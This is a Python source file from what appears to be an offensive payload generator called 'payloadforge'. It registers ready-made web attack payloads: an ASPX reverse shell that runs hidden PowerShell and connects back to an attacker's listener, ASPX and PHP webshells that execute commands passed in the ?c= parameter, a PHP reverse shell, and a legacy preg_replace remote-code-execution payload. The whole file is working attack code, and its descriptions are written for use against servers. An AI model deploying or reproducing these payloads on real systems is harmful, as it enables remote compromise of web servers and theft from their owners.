"""ASP.NET, ASPX, and additional web payloads."""

from payloadforge.payloads.registry import register

register(
    "aspx_reverse",
    "web", "aspx",
    "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %><% Process p = new Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.Arguments = \"/c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\\\"\"; p.StartInfo.UseShellExecute = false; p.StartInfo.CreateNoWindow = true; p.Start(); %>",
    "ASPX reverse shell — drops an interactive PowerShell back to your listener.",
    testable=False,
    test_note="Requires write access to an IIS/ASP.NET webroot.",
    tags=["aspx", "iis", "reverse"],
)

register(
    "aspx_cmd_shell",
    "web", "aspx",
    "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %><% Response.Write(\"<pre>\"); Process p = new Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.Arguments = \"/c \" + Request[\"c\"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); p.WaitForExit(); Response.Write(\"</pre>\"); %>",
    "ASPX webshell — accepts a command via ?c= and returns output.",
    testable=False,
    test_note="Requires write access to an IIS webroot.",
    tags=["aspx", "webshell"],
)

register(
    "php_cmd_shell",
    "web", "php",
    "<?php if(isset($_GET['c'])){ system($_GET['c']); } ?>",
    "PHP webshell — one line. Accepts commands via ?c=",
    testable=True,
    test_note="Requires PHP. Test with: php -r 'system(\"id\");'",
    tags=["php", "webshell"],
)

register(
    "php_reverse",
    "web", "php",
    "<?php $s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>",
    "PHP reverse shell — connects back to your listener when requested.",
    testable=False,
    test_note="Requires PHP with exec() enabled.",
    tags=["php", "reverse"],
)

register(
    "php_preg_replace_rce",
    "web", "php",
    "<?php preg_replace('/.*/e', 'system($_GET[\"c\"])', ''); ?>",
    "PHP preg_replace /e modifier RCE — only works on PHP < 7.0.",
    testable=False,
    test_note="Deprecated in PHP 7.0+.",
    tags=["php", "legacy", "rce"],
)
